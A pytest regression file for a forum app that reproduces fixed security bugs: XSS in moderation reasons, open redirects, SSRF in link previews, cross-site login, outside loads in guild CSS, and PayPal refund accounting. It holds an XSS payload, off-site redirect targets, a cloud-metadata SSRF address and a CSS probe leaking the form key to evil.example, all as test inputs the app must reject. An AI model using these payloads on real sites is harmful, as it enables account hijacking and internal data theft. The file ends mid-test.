"""One reproducing test (or a few) per bug fixed in the bug hunt of 2026-10, on the real app and a real Postgres. Each
section names the finding (C1, H1, ... in the plan); each test failed on the code before its fix."""
import secrets
import sys
import time

import pytest

from sqlalchemy import text

from .test_characterization import BASE, addr, fake_paypal, fresh, guildmaster_with_post, post

# guildmaster_with_post and fake_paypal are fixtures: importing them here makes them available to this file's tests
assert guildmaster_with_post and fake_paypal

XSS = '<img src=x onerror="alert(1)">'


# ---------------------------------------------------------------- C1: a guild's hide reason is drawn as written

def _comment_on(member, post_id):
    from ruqqus.classes import Comment
    from ruqqus.helpers.base36 import base36encode
    here = member.browser()
    answer = post(here, "/api/comment", {"parent_fullname": f"t2_{base36encode(post_id)}", "body": "A comment " + secrets.token_hex(3),
                                         "formkey": member.formkey(here)})
    assert answer.status_code == 200, answer.get_data(as_text=True)[:300]
    return fresh(member).query(Comment).filter_by(parent_submission=post_id, author_id=member.id).order_by(Comment.id.desc()).first().id


def test_c1_a_post_hide_reason_with_markup_is_shown_as_text(guildmaster_with_post):
    from ruqqus.helpers.base36 import base36encode
    mod, author, copy_id = guildmaster_with_post
    client = mod.browser()
    assert post(client, f"/mod/kick/general/{base36encode(copy_id)}", {"reason": XSS, "formkey": mod.formkey(client)}).status_code == 200
    page = author.browser().get(f"/post/{base36encode(copy_id)}", base_url=BASE, follow_redirects=True).get_data(as_text=True)
    assert XSS not in page and "&lt;img src=x" in page, "the hidden post's page"
    log = author.browser().get("/+general/mod/log", base_url=BASE).get_data(as_text=True)
    assert XSS not in log and "&lt;img src=x" in log, "the public mod log"


def test_c1_a_comment_hide_reason_with_markup_is_shown_as_text(guildmaster_with_post):
    from ruqqus.helpers.base36 import base36encode
    mod, author, copy_id = guildmaster_with_post
    cid = _comment_on(author, copy_id)
    client = mod.browser()
    assert post(client, f"/mod/hide_comment/general/{base36encode(cid)}", {"reason": XSS, "formkey": mod.formkey(client)}).status_code == 200
    log = author.browser().get("/+general/mod/log", base_url=BASE).get_data(as_text=True)
    assert XSS not in log and "&lt;img src=x" in log


# ---------------------------------------------------------------- H5: signing in can send people to another site

OFF_SITE = ["https://evil.example/x", "//evil.example/x", "/\evil.example/x", "\\evil.example", "https:evil.example",
            "javascript:alert(1)", " https://evil.example", "/\tx//evil.example"]


def test_h5_signing_in_never_sends_the_browser_off_site(make_member, real_app):
    from urllib.parse import urlsplit
    app, _ = real_app
    member = make_member()
    for target in OFF_SITE:
        answer = post(app.test_client(), "/login", {"username": member.username, "password": member.password, "redirect": target})
        assert answer.status_code == 302, target
        where = urlsplit(answer.headers["Location"])
        assert where.netloc in ("", "localhost") and not where.path.startswith("//"), (target, answer.headers["Location"])


def test_h5_a_signed_in_member_opening_the_login_page_stays_on_the_site(make_member):
    from urllib.parse import quote, urlsplit
    member = make_member()
    for target in OFF_SITE:
        answer = member.browser().get("/login?redirect=" + quote(target, safe=""), base_url=BASE)
        assert answer.status_code == 302, target
        where = urlsplit(answer.headers["Location"])
        assert where.netloc in ("", "localhost") and not where.path.startswith("//"), (target, answer.headers["Location"])


# ---------------------------------------------------------------- the site-bots migration re-run refuses own-account rows

def test_running_the_site_bots_migration_again_keeps_own_account_rows(pg_engine):
    """2026-10-16_site_bots.sql re-added a two-kind CHECK on every run, so once a member's own account posted
    automatically (kind 'self', 2026-11-21) running the file again failed: migrations must be safe to run twice."""
    from pathlib import Path
    sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "scripts"))
    import migrate
    uid = 900_000_000 + secrets.randbelow(90_000_000)
    with pg_engine.connect() as conn:
        conn.execute(text("INSERT INTO bots (user_id, owner_id, username, kind, proposed_by_id, status) "
                          "VALUES (:u, :u, :n, 'self', :u, 'pending')"), {"u": uid, "n": f"own_{uid}"})
        conn.commit()
        try:
            migrate.run_file(conn, "2026-10-16_site_bots.sql")
            kinds = conn.execute(text("SELECT pg_get_constraintdef(oid) FROM pg_constraint WHERE conname = 'bots_kind'")).scalar()
            assert "'self'" in kinds, "the newer, wider rule stays"
        finally:
            conn.rollback()
            conn.execute(text("DELETE FROM bots WHERE user_id = :u"), {"u": uid})
            conn.commit()


# ---------------------------------------------------------------- H7: analytics only from the owner's own host

def test_h7_the_analytics_script_is_drawn_only_while_set_and_the_privacy_page_names_it(real_app, monkeypatch):
    app, _ = real_app
    off = app.test_client().get("/help/privacy", base_url=BASE).get_data(as_text=True)
    assert "ruqqus.com/js" not in off and 'id="analytics"' not in off and "stats.example.org" not in off
    monkeypatch.setitem(app.config, "ANALYTICS_SRC", "https://stats.example.org/js/script.js")
    monkeypatch.setitem(app.config, "ANALYTICS_DOMAIN", "laba.example")
    monkeypatch.setitem(app.config, "ANALYTICS_HOST", "stats.example.org")
    # Jinja folds `'NAME' | app_config` into the compiled template, and the app keeps compiled templates for good
    # (config doesn't change while a site runs): draw these pages from a fresh cache, put back after the test
    monkeypatch.setattr(app.jinja_env, "cache", {})
    page = app.test_client().get("/help/privacy", base_url=BASE).get_data(as_text=True)
    assert '<script defer data-domain="laba.example" src="https://stats.example.org/js/script.js"></script>' in page
    assert 'id="analytics"' in page and "at stats.example.org." in page
    home = app.test_client().get("/", base_url=BASE, follow_redirects=True).get_data(as_text=True)
    assert home.count('src="https://stats.example.org/js/script.js"') == 1, "and on the site's own layout"


# ---------------------------------------------------------------- H1, H2: a member's link can't make the site read its own network

def _serve(*answers):
    """A server on this machine that answers one request per entry: (status, content type, body). Returns its address
    and the requests it got (none, if the site never called it)."""
    import socket
    import threading
    listener = socket.socket()
    listener.bind(("127.0.0.1", 0))
    listener.listen(len(answers))
    listener.settimeout(20)
    seen = []

    def run():
        try:
            for status, kind, body in answers:
                conn, _ = listener.accept()
                seen.append(conn.recv(65536).decode("latin-1"))
                conn.sendall(f"HTTP/1.1 {status} X\r\nContent-Type: {kind}\r\nContent-Length: {len(body)}\r\n\r\n".encode() + body)
                conn.close()
        except OSError:
            pass
        finally:
            listener.close()

    threading.Thread(target=run, daemon=True).start()
    return f"http://127.0.0.1:{listener.getsockname()[1]}", seen


PAGE = b'<html><head><title>Inside</title><meta property="og:image" content="/pic.png"></head></html>'


def _png():
    from io import BytesIO
    from PIL import Image
    out = BytesIO()
    Image.new("RGB", (40, 40), (20, 140, 210)).save(out, "PNG")
    return out.getvalue()


def test_h1_the_title_suggestion_never_reads_an_address_off_the_public_internet(make_member, monkeypatch):
    monkeypatch.delenv("FEED_SERVER_ALLOW_LOCAL", raising=False)         # the dev container sets it for its test servers
    member = make_member()
    base, seen = _serve((200, "text/html", PAGE))
    answer = member.browser().get("/submit/title?url=" + base + "/", base_url=BASE, environ_base={"REMOTE_ADDR": addr()})
    assert answer.status_code == 400 and "Inside" not in answer.get_data(as_text=True)
    assert seen == [], "the site never called it"
    for inside in ("http://169.254.169.254/latest/meta-data/", "http://postgres:5432/", "http://redis:6379/"):
        assert member.browser().get("/submit/title?url=" + inside, base_url=BASE, environ_base={"REMOTE_ADDR": addr()}).status_code == 400, inside


def test_h1_the_title_suggestion_still_reads_a_page(make_member, monkeypatch):
    monkeypatch.setenv("FEED_SERVER_ALLOW_LOCAL", "1")                  # the only way to stand in for a public page here
    member = make_member()
    base, seen = _serve((302, "text/html", b""), (200, "text/html", PAGE))
    answer = member.browser().get("/submit/title?url=" + base + "/", base_url=BASE, environ_base={"REMOTE_ADDR": addr()})
    assert answer.status_code == 400 and seen, "a redirect with no Location goes nowhere"
    base, seen = _serve((200, "text/html", PAGE))
    answer = member.browser().get("/submit/title?url=" + base + "/a", base_url=BASE, environ_base={"REMOTE_ADDR": addr()})
    assert answer.status_code == 200 and answer.get_json()["title"] == "Inside" and len(seen) == 1


def _link_post(member, url):
    """A text post of `member` whose link is then set to `url` (so no preview runs while it is made)."""
    from ruqqus.helpers.base36 import base36decode
    here = member.browser()
    answer = post(here, "/api/vue/submit", {"title": f"Link {secrets.token_hex(4)}", "body": "text",
                                            "formkey": member.formkey(here), "post_to_profile": "1"})
    assert answer.status_code == 200, answer.get_data(as_text=True)[:300]
    pid = base36decode(answer.get_json()["id"])
    db = fresh(member)
    db.execute(text("UPDATE submissions_aux SET url = :u, embed_url = '' WHERE id = :p"), {"u": url, "p": pid})
    db.commit()
    return pid


def _preview(pid):
    from ruqqus.helpers.base36 import base36encode
    from ruqqus.helpers.thumbs import thumbnail_thread
    return thumbnail_thread(base36encode(pid))


def test_h2_a_link_preview_never_reads_an_address_off_the_public_internet(make_member, real_app, monkeypatch):
    monkeypatch.delenv("FEED_SERVER_ALLOW_LOCAL", raising=False)
    member = make_member()
    base, seen = _serve((200, "text/html", PAGE), (200, "image/png", _png()))
    pid = _link_post(member, base + "/page")
    app, _ = real_app
    with app.app_context():
        done, why = _preview(pid)
    assert not done and why == "Unable to connect to source"
    assert seen == []


def test_h2_a_link_preview_still_reads_the_title_and_picture(make_member, real_app, monkeypatch):
    monkeypatch.setenv("FEED_SERVER_ALLOW_LOCAL", "1")
    # thumbs.expand_url makes every picture address https (as it always has); the stand-in server here speaks http
    thumbs = sys.modules["ruqqus.helpers.thumbs"]
    monkeypatch.setattr(thumbs, "expand_url", lambda page, found: page.rsplit("/", 1)[0] + found)
    member = make_member()
    base, seen = _serve((200, "text/html", PAGE), (200, "image/png", _png()))
    pid = _link_post(member, base + "/page")
    app, _ = real_app
    with app.app_context():
        done, why = _preview(pid)
    assert done, why
    row = fresh(member).execute(text("SELECT meta_title, preview_image_url FROM submissions_aux WHERE id = :p"), {"p": pid}).first()
    assert row[0] == "Inside" and row[1].endswith("/pic.png") and len(seen) == 2


# ---------------------------------------------------------------- M2: an IP ban is a POST with the form key

def _doc_ip():
    return f"203.0.113.{secrets.randbelow(250) + 1}"           # a documentation range: never a real member's


def _admin(make_member, level=4):
    admin = make_member()
    db = admin.db_session()
    db.execute(text("UPDATE users SET admin_level = :l WHERE id = :u"), {"l": level, "u": admin.id})
    db.commit()
    return admin


def _banned(db, *ips):
    return db.execute(text("SELECT count(*) FROM ips WHERE addr = ANY(:a)"), {"a": list(ips)}).scalar()


def test_m2_opening_a_link_never_bans_anyone(make_member):
    admin, target = _admin(make_member), make_member()
    ip = _doc_ip()
    db = fresh(admin)
    db.execute(text("UPDATE users SET creation_ip = :i, creation_region = 'GB' WHERE id = :u"), {"i": ip, "u": target.id})
    db.commit()
    try:
        admin.browser().get(f"/admin/get_ip?link=/@{target.username}&ipnuke=1", base_url=BASE)
        assert _banned(fresh(admin), ip) == 0, "a GET a crafted link can make an admin's browser send"
    finally:
        db = fresh(admin)
        db.execute(text("DELETE FROM ips WHERE addr = :i"), {"i": ip})
        db.commit()


def test_m2_the_ban_needs_the_form_key_and_covers_the_accounts_comments(make_member, guildmaster_with_post):
    _, author, copy_id = guildmaster_with_post
    admin = _admin(make_member)
    cid = _comment_on(author, copy_id)
    signed_up, commented = _doc_ip(), _doc_ip()
    db = fresh(admin)
    db.execute(text("UPDATE users SET creation_ip = :i, creation_region = 'GB' WHERE id = :u"), {"i": signed_up, "u": author.id})
    db.execute(text("UPDATE comments SET creation_ip = :i, creation_region = 'GB' WHERE id = :c"), {"i": commented, "c": cid})
    db.commit()
    try:
        client = admin.browser()
        refused = post(client, "/admin/ipnuke", {"link": f"/@{author.username}"})
        # a 401 to a page request is drawn as a redirect to signing in (routes/errors.py)
        assert refused.status_code == 401 or (refused.status_code == 302 and "/login" in refused.headers["Location"])
        assert _banned(fresh(admin), signed_up, commented) == 0
        level3 = _admin(make_member, 3)
        here = level3.browser()
        assert post(here, "/admin/ipnuke", {"link": f"/@{author.username}", "formkey": level3.formkey(here)}).status_code in (403, 404)
        done = post(client, "/admin/ipnuke", {"link": f"/@{author.username}", "formkey": admin.formkey(client)})
        assert done.status_code == 200, done.get_data(as_text=True)[:300]
        assert _banned(fresh(admin), signed_up, commented) == 2, "the comment's address too"
    finally:
        db = fresh(admin)
        db.execute(text("DELETE FROM ips WHERE addr IN (:a, :b)"), {"a": signed_up, "b": commented})
        db.commit()


# ---------------------------------------------------------------- M8: another site can't sign a visitor in

def _sign_in(app, member, **headers):
    client = app.test_client()
    answer = client.post("/login", base_url=BASE, environ_base={"REMOTE_ADDR": addr()},
                         headers={"User-Agent": "ci", **headers},
                         data={"username": member.username, "password": member.password, "redirect": "/"})
    signed_in = client.get("/settings/profile", base_url=BASE).status_code == 200
    return answer.status_code, signed_in


def test_m8_a_sign_in_sent_from_another_sites_page_is_refused(make_member, real_app):
    app, _ = real_app
    member = make_member()
    for headers in ({"Origin": "https://evil.example"}, {"Origin": "null"}, {"Sec-Fetch-Site": "cross-site"},
                    {"Origin": "https://localhost.evil.example"}):
        status, signed_in = _sign_in(app, member, **headers)
        assert status == 403 and not signed_in, headers


def test_m8_a_sign_in_from_the_sites_own_page_still_works(make_member, real_app):
    app, _ = real_app
    member = make_member()
    assert _sign_in(app, member, Origin="http://localhost", **{"Sec-Fetch-Site": "same-origin"}) == (302, True)
    assert _sign_in(app, member) == (302, True), "an app or a script sends neither header"


# ---------------------------------------------------------------- M1: a guild's stylesheet loads nothing from outside

OUTSIDE = ["@media all { body { background: url(https://evil.example/a.png) } }",
           "@font-face { font-family: x; src: url(https://evil.example/f.woff) }",
           'body { background: image-set("https://evil.example/a.png" 1x) }',
           "@media all { input[name=formkey][value^=a] { background: url(//evil.example/a) } }"]


def _stylesheet(mod):
    return fresh(mod).execute(text("SELECT css FROM boards WHERE id = 1")).scalar() or ""


def test_m1_a_guild_stylesheet_that_loads_an_outside_address_is_refused(guildmaster_with_post):
    mod, _, _ = guildmaster_with_post
    client = mod.browser()
    for css in OUTSIDE:
        answer = post(client, "/mod/1/settings/css", {"css": css, "formkey": mod.formkey(client)})
        assert answer.status_code in (400, 422), (css, answer.status_code)
        assert "evil.example" not in _stylesheet(mod), css


def test_m1_the_sites_own_pictures_and_animations_still_save(guildmaster_with_post, real_app):
    app, _ = real_app
    mod, _, _ = guildmaster_with_post
    client = mod.browser()
    bucket = app.config["S3_BUCKET"]
    css = (f".x {{ background: url(https://{bucket}/a.png) }}\n"
           "@keyframes spin { from { opacity: 0 } to { opacity: 1 } }")
    answer = post(client, "/mod/1/settings/css", {"css": css, "formkey": mod.formkey(client)})
    assert answer.status_code in (200, 204, 302), answer.get_data(as_text=True)[:200]
    saved = _stylesheet(mod)
    assert bucket in saved and "spin" in saved


def test_m1_a_stylesheet_saved_through_the_old_gap_is_not_served(guildmaster_with_post):
    mod, author, _ = guildmaster_with_post
    db = fresh(mod)
    db.execute(text("UPDATE boards SET css = :c WHERE id = 1"), {"c": OUTSIDE[0]})
    db.commit()
    served = author.browser().get("/+general/css", base_url=BASE)
    assert served.status_code == 200 and "evil.example" not in served.get_data(as_text=True)
    db = fresh(mod)
    db.execute(text("UPDATE boards SET css = '' WHERE id = 1"))
    db.commit()


# ---------------------------------------------------------------- H4: what an account owes never goes below 0

def _owed(member):
    return fresh(member).execute(text("SELECT negative_balance_cents FROM users WHERE id = :u"), {"u": member.id}).scalar()


def _txns(member):
    return fresh(member).execute(text("SELECT count(*) FROM paypal_txns WHERE user_id = :u"), {"u": member.id}).scalar()


def test_h4_a_purchase_of_no_coins_or_an_unreadable_count_is_refused_and_locks_nothing(make_member, fake_paypal):
    member = make_member()
    client = member.browser()
    for count in ("0", "-5", "abc", "1.5", "99999"):
        answer = post(client, "/shop/buy_coins", {"coin_count": count, "formkey": member.formkey(client)})
        assert answer.status_code == 400, (count, answer.status_code)
    assert fake_paypal.created == [] and _txns(member) == 0
    assert _owed(member) == 0


def test_h4_paying_off_a_debt_never_leaves_it_below_zero(make_member, fake_paypal):
    from ruqqus.helpers.base36 import base36encode
    member = make_member()
    client = member.browser()
    assert post(client, "/shop/negative_balance", {"formkey": member.formkey(client)}).status_code == 400, "nothing owed"
    db = fresh(member)
    db.execute(text("UPDATE users SET negative_balance_cents = 100 WHERE id = :u"), {"u": member.id})
    # a debt-payment order larger than what is owed now (the debt was lowered by hand after the order was opened)
    txn = db.execute(text("INSERT INTO paypal_txns (user_id, created_utc, coin_count, usd_cents, status, paypal_id) "
                          "VALUES (:u, 0, 0, 300, 1, :o) RETURNING id"), {"u": member.id, "o": "ORDER-" + secrets.token_hex(5)}).scalar()
    db.commit()
    done = client.get(f"/shop/buy_coins_completed?txid={base36encode(txn)}", base_url=BASE)
    assert done.status_code == 200
    assert _owed(member) == 0


def test_h4_the_migration_sets_values_below_zero_back_once_and_keeps_them_from_coming_back(pg_engine, make_member):
    from pathlib import Path
    sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "scripts"))
    import migrate
    name = "2026-11-23_owed_never_below_zero.sql"
    member = make_member()
    member.db_session().rollback()        # the app's session would hold its read lock on users, and ALTER TABLE wait on it
    with pg_engine.connect() as conn:
        conn.execute(text("SET lock_timeout = '10s'"))
        conn.execute(text("ALTER TABLE users DROP CONSTRAINT IF EXISTS users_owed_never_below_zero"))
        conn.execute(text("DELETE FROM schema_migrations WHERE name = :n"), {"n": name})
        conn.execute(text("UPDATE users SET negative_balance_cents = -49 WHERE id = :u"), {"u": member.id})
        conn.commit()
        try:
            migrate.run_file(conn, name)
            conn.commit()
            assert conn.execute(text("SELECT negative_balance_cents FROM users WHERE id = :u"), {"u": member.id}).scalar() == 0
            migrate.run_file(conn, name)
            conn.commit()
            with pytest.raises(Exception) as refused:
                conn.execute(text("UPDATE users SET negative_balance_cents = -1 WHERE id = :u"), {"u": member.id})
            conn.rollback()
            assert "users_owed_never_below_zero" in str(refused.value)
        finally:
            conn.rollback()
            conn.execute(text("UPDATE users SET negative_balance_cents = 0 WHERE id = :u"), {"u": member.id})
            conn.commit()


def test_h1_a_link_with_other_scripts_in_it_still_gets_a_title(make_member, monkeypatch):
    """The first page_fetch let http.client's UnicodeEncodeError through: a 500 for /wiki/Café (found in review)."""
    monkeypatch.setenv("FEED_SERVER_ALLOW_LOCAL", "1")
    member = make_member()
    base, seen = _serve((200, "text/html", PAGE))
    answer = member.browser().get("/submit/title?url=" + base + "/wiki/Café", base_url=BASE, environ_base={"REMOTE_ADDR": addr()})
    assert answer.status_code == 200 and answer.get_json()["title"] == "Inside"
    assert seen[0].startswith("GET /wiki/Caf%C3%A9 ")


def test_h2_an_oembed_address_named_by_the_members_page_is_read_through_the_guard(real_app, monkeypatch):
    """embed.detect_video_embed fetched the page's own <link type=application/json+oembed> with plain requests,
    redirects followed (found in review): it now goes through page_fetch, whose every hop is judged."""
    from bs4 import BeautifulSoup
    embed = sys.modules["ruqqus.helpers.embed"]
    page_fetch = sys.modules["ruqqus.helpers.page_fetch"]
    endpoint = "https://www.youtube.com/oembed?url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3Dabcdefghijk"
    asked = []
    answer = b'{"type": "video", "html": "<iframe src=\\"https://www.youtube.com/embed/abcdefghijk\\"></iframe>"}'
    monkeypatch.setattr(page_fetch, "get", lambda url, **kw: asked.append(url) or page_fetch.Page(200, "application/json", answer, url, True))

    def plain(*a, **k):
        raise AssertionError("plain requests was used")
    monkeypatch.setattr(embed.requests, "get", plain)
    soup = BeautifulSoup(f'<html><head><link type="application/json+oembed" href="{endpoint}"></head></html>', "html.parser")
    found = embed.detect_video_embed("https://blog.example.org/a-video", page_fetch.Page(200, "text/html", b"", "", True), soup)
    assert asked == [endpoint]
    assert found[0] in ("iframe", "audio") and found[1] == "https://www.youtube.com/embed/abcdefghijk"


def test_c1_an_admin_nukes_typed_reason_is_shown_as_text_on_the_removed_post(make_member, guildmaster_with_post):
    """admin_nuke_user copied the account's typed ban reason onto each post, drawn with `| safe` (found in review)."""
    from ruqqus.helpers.base36 import base36encode
    _, author, copy_id = guildmaster_with_post
    admin = _admin(make_member)
    db = fresh(admin)
    db.execute(text("UPDATE users SET ban_reason = :r WHERE id = :u"), {"r": XSS, "u": author.id})
    db.commit()
    client = admin.browser()
    assert post(client, "/admin/nuke_user", {"user": author.username, "formkey": admin.formkey(client)}).status_code in (200, 302)
    reader = make_member()                  # an admin is shown the post itself; a member gets the removed page with its reason
    page = reader.browser().get(f"/post/{base36encode(copy_id)}", base_url=BASE, follow_redirects=True).get_data(as_text=True)
    assert XSS not in page and "&lt;img src=x" in page


# ---------------------------------------------------------------- H3: a refund or chargeback reaches the account, once

def _paid_order(member, cents=499):
    order, capture = "ORDER-" + secrets.token_hex(5).upper(), "CAPTURE-" + secrets.token_hex(5).upper()
    db = fresh(member)
    txn = db.execute(text("INSERT INTO paypal_txns (user_id, created_utc, coin_count, usd_cents, status, paypal_id, "
                          "paypal_capture_id) VALUES (:u, 0, 5, :c, 3, :o, :k) RETURNING id"),
                     {"u": member.id, "c": cents, "o": order, "k": capture}).scalar()
    db.commit()
    return txn, order, capture


def _event(kind, resource):
    return {"id": "WH-" + secrets.token_hex(6).upper(), "event_type": kind, "resource": resource}


def _refund(capture, value="4.99"):
    return _event("PAYMENT.CAPTURE.REFUNDED", {
        "id": "REFUND-" + secrets.token_hex(4), "amount": {"currency_code": "USD", "value": value},
        "links": [{"href": f"https://api.paypal.com/v2/payments/captures/{capture}", "rel": "up"}]})


def _hook(app, event):
    return app.test_client().post("/shop/paypal_webhook", base_url=BASE, json=event)


def test_h3_a_refund_reaches_the_account_and_is_counted_once(make_member, real_app, fake_paypal):
    from ruqqus.helpers import paypal_events
    app, _ = real_app
    member = make_member()
    txn, _, capture = _paid_order(member)
    event = _refund(capture)
    assert _hook(app, event).status_code == 204
    assert _owed(member) == paypal_events.owed_for(499)
    assert _hook(app, event).status_code == 204, "PayPal sends an event again"
    assert _owed(member) == paypal_events.owed_for(499), "counted once"
    row = fresh(member).execute(text("SELECT status, refunded_cents FROM paypal_txns WHERE id = :t"), {"t": txn}).first()
    assert tuple(row) == (-2, 499)


def test_h3_a_chargeback_and_a_refund_of_the_same_money_count_once(make_member, real_app, fake_paypal):
    from ruqqus.helpers import paypal_events
    app, _ = real_app
    member = make_member()
    _, order, capture = _paid_order(member)
    chargeback = _event("PAYMENT.CAPTURE.REVERSED", {"id": capture, "amount": {"currency_code": "USD", "value": "4.99"},
                                                      "supplementary_data": {"related_ids": {"order_id": order}}})
    assert _hook(app, chargeback).status_code == 204
    assert _hook(app, _refund(capture)).status_code == 204
    assert _owed(member) == paypal_events.owed_for(499)


def test_h3_an_event_for_no_order_of_the_site_or_a_body_that_isnt_json_is_answered_without_error(real_app, fake_paypal):
    app, _ = real_app
    assert _hook(app, _refund("CAPTURE-NOT-OURS")).status_code == 204, "kept as handled, so PayPal stops sending it"
    bad = app.test_client().post("/shop/paypal_webhook", base_url=BASE, data="not json", content_type="application/json")
    assert bad.status_code == 400
    assert app.test_client().post("/shop/paypal_webhook", base_url=BASE, json=["a list"]).status_code == 400


def test_h3_paying_an_order_keeps_the_capture_refunds_will_name(make_member, real_app, monkeypatch):
    from types import SimpleNamespace
    paypal = sys.modules["ruqqus.routes.paypal"]
    member = make_member()
    order = {"id": "ORDER-X", "status": "COMPLETED", "payer": {"address": {"country_code": "GB"}},
             "purchase_units": [{"payments": {"captures": [{"id": "CAPTURE-KEPT", "status": "COMPLETED"}]}}]}
    monkeypatch.setattr(paypal.CLIENT, "_post", lambda url, data=None: SimpleNamespace(json=lambda: order))
    txn = paypal.PayPalTxn(user_id=member.id, paypal_id="ORDER-X", usd_cents=499, coin_count=5, status=1)
    assert paypal.CLIENT.capture(txn) is True
    assert txn.status == 3 and txn.paypal_capture_id == "CAPTURE-KEPT" and txn.payer_country == "GB"


# ---------------------------------------------------------------- M6: the admins' money page

def _money(admin):
    import re
    page = admin.browser().get("/admin/money", base_url=BASE).get_data(as_text=True)
    rows = dict(re.findall(r"<td>(\w+)</td>\s*<td>([^<]*)</td>", page))
    written_off = rows.get("cents_written_off")
    return (int(written_off) if written_off not in (None, "None", "") else 0), round(float(rows["revenue_usd_ytd"]) * 100)


def test_m6_written_off_counts_permanent_bans_only_and_a_refund_lowers_revenue_once(make_member):
    from ruqqus.helpers import money_stats
    admin = _admin(make_member, 2)
    temporary, permanent, buyer = make_member(), make_member(), make_member()
    written_off, revenue = _money(admin)
    db = fresh(admin)
    db.execute(text("UPDATE users SET negative_balance_cents = 1000, is_banned = 1, unban_utc = :t WHERE id = :u"),
               {"t": int(time.time()) + 86400, "u": temporary.id})
    db.execute(text("UPDATE users SET negative_balance_cents = 700, is_banned = 1, unban_utc = 0 WHERE id = :u"), {"u": permanent.id})
    now = int(time.time())
    for status, refunded in ((3, 0), (-2, 499)):
        db.execute(text("INSERT INTO paypal_txns (user_id, created_utc, coin_count, usd_cents, status, paypal_id, refunded_cents) "
                        "VALUES (:u, :t, 5, 499, :s, :o, :r)"),
                   {"u": buyer.id, "t": now, "s": status, "o": "ORDER-" + secrets.token_hex(5), "r": refunded})
    db.commit()
    try:
        after_off, after_revenue = _money(admin)
        assert after_off - written_off == 700, "the temporary ban still owes it"
        assert after_revenue - revenue == 2 * money_stats.net_of_fees(499) - 499
    finally:
        db = fresh(admin)
        db.execute(text("UPDATE users SET negative_balance_cents = 0 WHERE id IN (:a, :b)"), {"a": temporary.id, "b": permanent.id})
        db.execute(text("DELETE FROM paypal_txns WHERE user_id = :u"), {"u": buyer.id})
        db.commit()


# ---------------------------------------------------------------- H6: a password reset keeps the password rules

def _reset_form(member):
    from ruqqus.helpers.security import generate_hash
    user = member.user()
    uid, nonce, now = user.id, user.login_nonce, int(time.time())
    return {"user_id": uid, "time": now, "token": generate_hash(f"{uid}+{now}+reset+{nonce}")}


def test_h6_a_reset_refuses_a_password_signing_up_would_refuse(make_member, real_app):
    app, _ = real_app
    member = make_member()
    form = _reset_form(member)
    for weak in ("", "a", "short12"):
        answer = post(app.test_client(), "/reset", {**form, "password": weak, "confirm_password": weak})
        assert answer.status_code == 200 and "between 8 and 100" in answer.get_data(as_text=True), repr(weak)
    signed = post(app.test_client(), "/login", {"username": member.username, "password": member.password, "redirect": "/"})
    assert signed.status_code == 302, "the old password still works: nothing was saved"


def test_h6_a_reset_form_or_link_cut_short_is_a_400_not_an_error(make_member, real_app):
    app, _ = real_app
    member = make_member()
    form = _reset_form(member)
    for broken in ({**form, "time": "soon"}, {k: v for k, v in form.items() if k != "time"},
                   {k: v for k, v in form.items() if k != "token"}, {**form, "user_id": "x"}):
        answer = post(app.test_client(), "/reset", {**broken, "password": "Long-enough-1", "confirm_password": "Long-enough-1"})
        assert answer.status_code == 400, broken
    for query in ("?id=1&time=soon&token=x", "?id=1&token=x", "?id=x&time=1&token=x", "?id=1&time=1"):
        assert app.test_client().get("/reset" + query, base_url=BASE).status_code == 400, query


# ---------------------------------------------------------------- batch B review: races, old orders, pending captures

def test_b_a_refund_during_a_debt_payment_is_not_lost(make_member, real_app, fake_paypal, monkeypatch):
    """The completion route wrote max(0, owed_when_it_started - paid): a refund landing meanwhile was overwritten."""
    import threading
    from ruqqus.helpers import paypal_events
    from ruqqus.helpers.base36 import base36encode
    app, _ = real_app
    paypal = sys.modules["ruqqus.routes.paypal"]
    member = make_member()
    client = member.browser()
    _, _, capture = _paid_order(member)                       # an earlier order, refunded while the debt is paid
    db = fresh(member)
    db.execute(text("UPDATE users SET negative_balance_cents = 1000 WHERE id = :u"), {"u": member.id})
    debt = db.execute(text("INSERT INTO paypal_txns (user_id, created_utc, coin_count, usd_cents, status, paypal_id) "
                           "VALUES (:u, 0, 0, 1000, 1, :o) RETURNING id"), {"u": member.id, "o": "ORDER-" + secrets.token_hex(5)}).scalar()
    db.commit()
    started = threading.Event()

    def slow_capture(txn):
        started.set()
        time.sleep(1.5)                                        # PayPal takes its time; the refund arrives now
        txn.status = 3
        return True
    monkeypatch.setattr(paypal.CLIENT, "capture", slow_capture)
    done = {}
    paying = threading.Thread(target=lambda: done.setdefault("pay", client.get(
        f"/shop/buy_coins_completed?txid={base36encode(debt)}", base_url=BASE).status_code))
    paying.start()
    assert started.wait(10)
    assert _hook(app, _refund(capture)).status_code == 204
    paying.join(20)
    assert done.get("pay") == 200
    assert _owed(member) == paypal_events.owed_for(499), "the refund's debt stays; the 1000 paid is gone"


def test_b_a_refund_of_an_order_paid_before_capture_ids_were_kept_is_found_through_paypal(make_member, real_app, fake_paypal, monkeypatch):
    from types import SimpleNamespace
    from ruqqus.helpers import paypal_events
    app, _ = real_app
    paypal = sys.modules["ruqqus.routes.paypal"]
    member = make_member()
    txn, order, _ = _paid_order(member)
    db = fresh(member)
    db.execute(text("UPDATE paypal_txns SET paypal_capture_id = NULL WHERE id = :t"), {"t": txn})
    db.commit()
    asked = []
    old_capture = "CAPTURE-OLD-" + secrets.token_hex(4)          # never kept on any order: found only through PayPal
    record = {"id": old_capture, "supplementary_data": {"related_ids": {"order_id": order}}}
    monkeypatch.setattr(paypal.CLIENT, "_get", lambda url: asked.append(url) or SimpleNamespace(json=lambda: record))
    assert _hook(app, _refund(old_capture)).status_code == 204
    assert asked == [f"/v2/payments/captures/{old_capture}"]
    assert _owed(member) == paypal_events.owed_for(499)
    kept = fresh(member).execute(text("SELECT paypal_capture_id FROM paypal_txns WHERE id = :t"), {"t": txn}).scalar()
    assert kept == old_capture


def test_b_a_capture_paypal_is_still_checking_gives_nothing_until_it_clears(make_member, real_app, fake_paypal, monkeypatch):
    from ruqqus.helpers.base36 import base36encode
    app, _ = real_app
    paypal = sys.modules["ruqqus.routes.paypal"]
    member = make_member()
    client = member.browser()
    before = member.user().coin_balance or 0
    order, capture = "ORDER-" + secrets.token_hex(5), "CAPTURE-" + secrets.token_hex(5)
    db = fresh(member)
    txn = db.execute(text("INSERT INTO paypal_txns (user_id, created_utc, coin_count, usd_cents, status, paypal_id) "
                          "VALUES (:u, 0, 5, 499, 1, :o) RETURNING id"), {"u": member.id, "o": order}).scalar()
    db.commit()

    def pending(t):
        t.status, t.paypal_capture_id = 4, capture
        return "PENDING"
